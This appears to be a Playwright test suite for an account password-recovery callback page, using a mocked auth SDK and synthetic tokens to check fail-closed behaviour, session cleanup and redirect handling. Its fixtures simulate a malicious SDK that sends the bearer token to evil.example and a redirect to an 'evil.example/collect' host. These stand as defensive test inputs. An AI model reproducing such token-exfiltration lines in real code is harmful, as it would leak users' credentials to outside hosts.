'use strict';
// Real entry/callback/UI modules with an intercepted native-SDK contract and synthetic Auth only.
const assert = require('node:assert/strict'), fs = require('node:fs'), path = require('node:path'), crypto = require('node:crypto');
const { chromium } = require('./encar/node_modules/playwright');
const ROOT = path.resolve(__dirname, '..'), ORIGIN = 'https://recovery-fixture.example';
const AUTH = 'https://rmlycycleuscfqywbihj.supabase.co', SDK = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.118.0/+esm';
const USER = '11111111-1111-4111-8111-111111111111', EMAIL = 'verified-dealer@example.invalid';
const TOKEN = Buffer.from('{"alg":"HS256","typ":"JWT"}').toString('base64url') + '.' + Buffer.from(JSON.stringify({ sub: USER, email: 'forged-claim@example.invalid', exp: 4102444800 })).toString('base64url') + '.synthetic_signature';
const REFRESH = 'synthetic-refresh-token', PASSWORD = 'SyntheticNewPassword!123';
const HASH = '#access_token=' + TOKEN + '&refresh_token=' + REFRESH + '&type=recovery';
const OUT = process.env.EMAIL_RECOVERY_ARTIFACT_DIR || '/workspace/work/phone-recovery-v2203/email-callback';
fs.mkdirSync(OUT, { recursive: true });
const results = [];
function deferred() { let resolve; const promise = new Promise(done => { resolve = done; }); return { promise, resolve }; }
async function signal(promise) { let timer; try { return await Promise.race([promise, new Promise((_, reject) => { timer = setTimeout(() => reject(Error('Synthetic recovery phase timed out')), 15000); })]); } finally { clearTimeout(timer); } }
const FRAMEWORK = String.raw`(() => {
 const persistence=[], rawGet=Storage.prototype.getItem, rawSet=Storage.prototype.setItem;
 rawSet.call(localStorage,'synthetic-main-auth','preserve-normal-session');
 window.name='preserve-normal-window-name';
 for(const name of ['getItem','setItem','removeItem','clear']){const old=Storage.prototype[name];Storage.prototype[name]=function(...args){persistence.push(name);void window.__recoveryPersistence(name);return old.apply(this,args);};}
 const oldOpen=indexedDB.open.bind(indexedDB);indexedDB.open=(...args)=>{persistence.push('indexedDB.open');void window.__recoveryPersistence('indexedDB.open');return oldOpen(...args);};
 window.__recoveryProbe=()=>({persistence:[...persistence],main:rawGet.call(localStorage,'synthetic-main-auth'),name:window.name,history:JSON.stringify(history.state)});
 window.__createRecoveryClient=(url,key,options)=>{
  window.__recoveryOptions={url,key,persistSession:options.auth.persistSession,autoRefreshToken:options.auth.autoRefreshToken,detectSessionInUrl:options.auth.detectSessionInUrl,storageKey:options.auth.storageKey};
  window.__recoveryMemory=options.auth.storage;let current=null;
  const request=async(path,init={})=>{try{const response=await options.global.fetch(url+path,{...init,headers:{apikey:key,Authorization:'Bearer '+(current?.access_token||key),'Content-Type':'application/json'}});const body=await response.json();return response.ok?{data:body,error:null}:{data:null,error:body};}catch(_){return{data:null,error:{code:'synthetic_network_error'}};}};
  return{auth:{
   async setSession(value){current=value;options.auth.storage.setItem('synthetic-session',JSON.stringify(value));const endpoint=window.__maliciousSdk?'https://evil.example/auth/v1/user':url+'/auth/v1/user?proof=set-session';if(window.__maliciousSdk){try{await options.global.fetch(endpoint,{headers:{Authorization:'Bearer '+value.access_token}});}catch(_){}return{error:{code:'bad_origin'}};}const result=await request('/auth/v1/user?proof=set-session');if(result.error){current=null;return result;}return{data:{session:current,user:{id:'22222222-2222-4222-8222-222222222222',email:'forged-session@example.invalid'}},error:null};},
   async getUser(){const result=await request('/auth/v1/user?proof=get-user');return result.error?result:{data:{user:result.data},error:null};},
   async updateUser(value){const result=await request('/auth/v1/user',{method:'PUT',body:JSON.stringify(value)});return result.error?result:{data:{user:result.data},error:null};},
   async signOut(value){void window.__recoveryMethod('signOut',value);let result={error:null};if(current)result=await request('/auth/v1/logout?scope='+value.scope,{method:'POST',body:'{}'});current=null;options.auth.storage.removeItem('synthetic-session');return{error:result.error};}
  }};
 };
})();`;
async function fixture(browser, options = {}) {
  const context = await browser.newContext({ viewport: { width: options.width || 1280, height: options.height || 900 } });
  const state = { requests: [], auth: [], puts: [], logouts: [], methods: [], persistence: [], errors: [], sdkUrls: [],
    getEntered: deferred(), getRelease: deferred(), putEntered: deferred(), putRelease: deferred(), sdkEntered: deferred(), sdkRelease: deferred(), ...options };
  await context.exposeBinding('__recoveryPersistence', (_source, value) => state.persistence.push(value));
  await context.exposeBinding('__recoveryMethod', (_source, kind, value) => state.methods.push({ kind, value }));
  await context.addInitScript(FRAMEWORK);
  if (options.maliciousSdk) await context.addInitScript(() => { window.__maliciousSdk = true; });
  let page;
  await context.route('**/*', async route => {
    const request = route.request(), url = new URL(request.url()); state.requests.push({ url: url.href, method: request.method(), referer: request.headers().referer });
    if (url.href === SDK) {
      state.sdkUrls.push(page.url()); state.sdkEntered.resolve(); if (state.holdSdk) await state.sdkRelease.promise;
      return route.fulfill({ contentType: 'application/javascript', body: 'export const createClient=(...args)=>window.__createRecoveryClient(...args);' }).catch(() => {});
    }
    if (url.origin === AUTH) {
      const record = { path: url.pathname, method: request.method(), phase: url.searchParams.get('proof'), body: request.postData(), authorization: request.headers().authorization };
      state.auth.push(record); assert.equal(request.headers().authorization, 'Bearer ' + TOKEN); assert.equal(request.headers().referer, undefined);
      if (url.pathname === '/auth/v1/logout') { assert.equal(url.searchParams.get('scope'), 'local'); state.logouts.push(record); return route.fulfill({ contentType: 'application/json', body: '{}' }).catch(() => {}); }
      assert.equal(url.pathname, '/auth/v1/user');
      if (request.method() === 'PUT') {
        state.puts.push(record); state.putEntered.resolve(); if (state.holdPut) await state.putRelease.promise;
        assert.deepEqual(Object.keys(JSON.parse(record.body)), ['password']);
        if (state.updateNetworkFailure) return route.abort('failed').catch(() => {});
        if (state.weakPassword && state.puts.length === 1) return route.fulfill({ status: 422, contentType: 'application/json', body: '{"code":"weak_password"}' }).catch(() => {});
        return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ id: USER, email: EMAIL }) }).catch(() => {});
      }
      if (record.phase === 'set-session' && state.sessionError) return route.fulfill({ status: 401, contentType: 'application/json', body: '{"code":"expired"}' });
      if (record.phase === 'set-session' && state.providerRedirect) return route.fulfill({ status: 302, headers: { Location: 'https://evil.example/collect' } });
      if (record.phase === 'get-user') { state.getEntered.resolve(); if (state.holdGet) await state.getRelease.promise; if (state.getUserError) return route.fulfill({ status: 401, contentType: 'application/json', body: '{"code":"expired"}' }).catch(() => {}); }
      return route.fulfill({ contentType: 'application/json', body: JSON.stringify({ id: USER, email: EMAIL }) }).catch(() => {});
    }
    assert.equal(url.origin, ORIGIN, 'Every request is intercepted; external destinations are forbidden');
    const contentType = 'text/html';
    if (['/account-recovery.html', '/account-recovery', '/account-recovery/'].includes(url.pathname)) return route.fulfill({ contentType, headers: {
      'Referrer-Policy': 'no-referrer', 'Cache-Control': 'no-store', 'Content-Security-Policy': "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self'; img-src 'self' data:; connect-src 'self' https://rmlycycleuscfqywbihj.supabase.co; frame-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'"
    }, body: fs.readFileSync(path.join(ROOT, 'account-recovery.html'), 'utf8') });
    if (url.pathname.startsWith('/assets/')) { const file = path.join(ROOT, url.pathname); if (fs.existsSync(file)) return route.fulfill({ path: file }); return route.fulfill({ status: 404, body: '' }); }
    if (url.pathname === '/__root-boot.js') return route.fulfill({ contentType: 'application/javascript', body: 'window.__mainBooted=true;' });
    return route.fulfill({ contentType, body: '<!doctype html><html><head><meta charset="utf-8"><meta name="referrer" content="no-referrer"><script src="/assets/account-recovery-entry.js?v=2.203"></script><script src="/__root-boot.js"></script></head><body><main id="login-fixture">Login</main></body></html>' });
  });
  page = await context.newPage(); page.setDefaultTimeout(10000); page.on('pageerror', error => state.errors.push(error.message));
  return { context, page, state, async close() { state.getRelease.resolve(); state.putRelease.resolve(); state.sdkRelease.resolve(); await context.close(); } };
}
async function ready(page) { await page.waitForFunction(() => document.getElementById('snote-email-recovery-form')?.hidden === false); }
async function message(page) { await page.locator('#snote-message-dialog[open]').waitFor(); }
async function accept(page) { if (await page.locator('#snote-message-dialog[open]').count()) await page.locator('#snote-message-dialog [data-message-accept]').click(); await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))); }
async function password(page, value = PASSWORD, confirmation = value) { await page.locator('#snote-email-recovery-password').fill(value); await page.locator('#snote-email-recovery-confirm').fill(confirmation); }
async function clean(page, state) {
  const data = await page.evaluate(() => __recoveryProbe()); assert.deepEqual(data.persistence, []); assert.deepEqual(state.persistence, []);
  assert.equal(data.main, 'preserve-normal-session'); assert.equal(data.name, 'preserve-normal-window-name');
  for (const secret of [TOKEN, REFRESH, PASSWORD, EMAIL]) assert(!data.history.includes(secret));
  assert(!page.url().includes(TOKEN)); assert(!page.url().includes(REFRESH)); assert(!page.url().includes(PASSWORD));
  assert.deepEqual(state.errors, []);
}
async function caseRun(browser, name, options, run) {
  const f = await fixture(browser, options);
  try { await run(f); results.push({ name, passed: true }); console.log('PASS ' + name); }
  catch (error) { await f.page.screenshot({ path: path.join(OUT, 'failure-' + results.length + '.png') }).catch(() => {}); throw error; }
  finally { await f.close(); }
}
async function main() {
  const files = ['account-recovery.html', 'assets/account-recovery-entry.js', 'assets/account-recovery-callback.js', 'assets/account-recovery-callback.css'];
  const hashes = Object.fromEntries(files.map(file => [file, crypto.createHash('sha256').update(fs.readFileSync(path.join(ROOT, file))).digest('hex')]));
  const browser = await chromium.launch({ headless: true, executablePath: process.env.CHROMIUM_PATH || '/usr/bin/chromium' });
  try {
    await caseRun(browser, 'root and signup confirmation remain ordinary login entries', {}, async ({ page: p, state }) => {
      for (const hash of ['', '#type=signup&access_token=' + TOKEN, '#error_code=otp_expired']) { await p.goto(ORIGIN + '/' + hash); await p.waitForFunction(() => window.__mainBooted === true); assert.equal(await p.evaluate(() => !!window.SnoteRecoveryRedirecting), false); }
      assert.equal(state.sdkUrls.length, 0); assert.equal(state.auth.length, 0); assert.equal(await p.locator('#login-fixture').isVisible(), true);
    });
    await caseRun(browser, 'a recovery fragment on another document does not hijack that document', {}, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/customer.html' + HASH); await p.waitForFunction(() => window.__mainBooted === true);
      assert.equal(p.url(), ORIGIN + '/customer.html' + HASH); assert.equal(await p.evaluate(() => !!window.SnoteRecoveryRedirecting), false);
      assert.equal(state.sdkUrls.length, 0); assert.equal(state.auth.length, 0); assert.equal(await p.locator('#login-fixture').isVisible(), true);
    });
    await caseRun(browser, 'root recovery goes to a clean callback and ID-only exit keeps normal auth untouched', {}, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/?next=https://evil.example/' + HASH); await ready(p);
      assert.equal(p.url(), ORIGIN + '/account-recovery.html'); assert.deepEqual(state.sdkUrls, [ORIGIN + '/account-recovery.html']);
      assert.equal(await p.locator('#snote-email-recovery-id').innerText(), EMAIL); assert(!await p.locator('body').innerText().then(text => text.includes('forged-')));
      const config = await p.evaluate(() => __recoveryOptions); assert.equal(config.persistSession, false); assert.equal(config.autoRefreshToken, false); assert.equal(config.detectSessionInUrl, false);
      assert.equal(await p.evaluate(() => SnoteRecoveryEntry.take()), null); assert.equal(state.puts.length, 0); await clean(p, state);
      await p.locator('#snote-email-recovery-login').click(); await p.waitForURL(ORIGIN + '/'); assert.equal(state.logouts.length, 1); assert.equal(state.methods[0].value.scope, 'local'); await clean(p, state);
    });
    for (const route of ['/account-recovery', '/account-recovery/']) await caseRun(browser, 'Pages pretty URL works: ' + route, {}, async ({ page: p, state }) => { await p.goto(ORIGIN + route + HASH); await ready(p); assert.equal(p.url(), ORIGIN + route); await clean(p, state); });
    for (const suffix of ['', '?code=synthetic', '#type=recovery&error=access_denied&error_description=untrusted', '#type=signup&access_token=' + TOKEN]) await caseRun(browser, 'missing/expired/PKCE/signup proof fails closed: ' + (suffix ? suffix.split('=')[0] : 'missing'), {}, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + suffix); await message(p); assert.equal(p.url(), ORIGIN + '/account-recovery.html');
      assert.equal(await p.locator('#snote-email-recovery-form').isVisible(), false); assert.equal(await p.locator('#snote-email-recovery-id').innerText(), '');
      assert.equal(state.sdkUrls.length, 0); assert.equal(state.auth.length, 0); await clean(p, state);
      await p.evaluate(() => document.getElementById('snote-email-recovery-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))); assert.equal(state.puts.length, 0);
    });
    await caseRun(browser, 'getUser server proof is required before any account display', { holdGet: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await signal(state.getEntered.promise);
      assert.equal(await p.locator('#snote-email-recovery-id').innerText(), ''); assert.equal(await p.locator('#snote-email-recovery-form').isVisible(), false);
      state.getRelease.resolve(); await ready(p); assert.equal(await p.locator('#snote-email-recovery-id').innerText(), EMAIL); await clean(p, state);
    });
    for (const kind of ['sessionError', 'getUserError', 'providerRedirect', 'maliciousSdk']) await caseRun(browser, 'invalid native proof/transport never reveals ID: ' + kind, { [kind]: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await message(p);
      assert.equal(await p.locator('#snote-email-recovery-id').innerText(), ''); assert.equal(await p.locator('#snote-email-recovery-form').isVisible(), false);
      assert.equal(state.puts.length, 0); assert.equal(state.requests.some(request => new URL(request.url).hostname === 'evil.example'), false); await clean(p, state);
    });
    for (const width of [1280, 390]) await caseRun(browser, 'validated password, shared messages, local cleanup and clean login: ' + width, { width, height: width === 390 ? 844 : 900 }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await ready(p);
      assert.equal(await p.locator('#snote-email-recovery-password').evaluate(node => getComputedStyle(node).fontSize), '16px');
      await password(p, 'short'); await p.locator('#snote-email-recovery-submit').click(); await message(p); assert.equal(state.puts.length, 0); await accept(p); await ready(p);
      await password(p, PASSWORD, PASSWORD + 'x'); await p.locator('#snote-email-recovery-submit').click(); await message(p); assert.equal(state.puts.length, 0); await accept(p); await ready(p);
      await password(p); await p.screenshot({ path: path.join(OUT, 'ready-' + width + '.png') });
      await p.locator('#snote-email-recovery-submit').click(); await p.evaluate(() => document.getElementById('snote-email-recovery-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true })));
      await message(p); assert.equal(state.puts.length, 1); assert.equal(JSON.parse(state.puts[0].body).password, PASSWORD); assert.equal(state.logouts.length, 1);
      assert.equal(await p.locator('#snote-email-recovery-password').inputValue(), ''); assert.equal(await p.locator('#snote-email-recovery-confirm').inputValue(), '');
      assert.equal(await p.evaluate(() => __recoveryMemory.getItem('synthetic-session')), null); await clean(p, state);
      await accept(p); await p.waitForURL(ORIGIN + '/'); await clean(p, state);
    });
    await caseRun(browser, 'weak password allows an explicit corrected submit without implicit retries', { width: 390, height: 844, weakPassword: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await ready(p); await password(p); await p.locator('#snote-email-recovery-submit').click(); await message(p);
      assert.equal(state.puts.length, 1); await accept(p); await ready(p); assert.equal(await p.locator('#snote-email-recovery-password').inputValue(), '');
      await password(p, PASSWORD + '2'); await p.locator('#snote-email-recovery-submit').click(); await message(p); assert.equal(state.puts.length, 2); assert.equal(state.logouts.length, 1); await clean(p, state);
    });
    await caseRun(browser, 'unknown password update outcome cannot be retried automatically', { updateNetworkFailure: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await ready(p); await password(p); await p.locator('#snote-email-recovery-submit').click(); await message(p);
      assert.equal(state.puts.length, 1); assert.equal(await p.locator('#snote-email-recovery-form').isVisible(), false);
      await p.evaluate(() => document.getElementById('snote-email-recovery-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))); assert.equal(state.puts.length, 1); await clean(p, state);
    });
    await caseRun(browser, 'closing during server proof discards late identity responses', { holdGet: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await signal(state.getEntered.promise);
      await p.locator('#snote-email-recovery-close').click(); await p.waitForURL(ORIGIN + '/'); state.getRelease.resolve();
      assert.equal(await p.locator('#snote-email-recovery-id').count(), 0); assert.equal(state.puts.length, 0); assert(state.logouts.length >= 1); await clean(p, state);
    });
    await caseRun(browser, 'pagehide and a changed URL clear private form data without another session', {}, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await ready(p); await password(p);
      await p.evaluate(() => window.dispatchEvent(new PageTransitionEvent('pagehide')));
      assert.equal(await p.locator('#snote-email-recovery-id').innerText(), ''); assert.equal(await p.locator('#snote-email-recovery-password').inputValue(), '');
      assert.equal(await p.locator('#snote-email-recovery-form').isVisible(), false); await clean(p, state);
      await p.evaluate(() => document.getElementById('snote-email-recovery-form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }))); assert.equal(state.puts.length, 0);
    });
    await caseRun(browser, 'leaving during SDK loading never establishes a delayed recovery session', { holdSdk: true }, async ({ page: p, state }) => {
      await p.goto(ORIGIN + '/account-recovery.html' + HASH); await signal(state.sdkEntered.promise);
      await p.locator('#snote-email-recovery-close').click(); await p.waitForURL(ORIGIN + '/'); state.sdkRelease.resolve();
      assert.equal(state.auth.length, 0); await clean(p, state);
    });
  } finally {
    await browser.close(); fs.writeFileSync(path.join(OUT, 'receipt.json'), JSON.stringify({ passed: results.length === 21, syntheticOnly: true,
      actualAuthRequests: 0, actualEmailsOrSmsSent: 0, hashes, results }, null, 2) + '\n');
  }
  assert.equal(results.length, 21);
}
if (require.main === module) main().catch(error => { console.error(error.stack || error); process.exitCode = 1; });
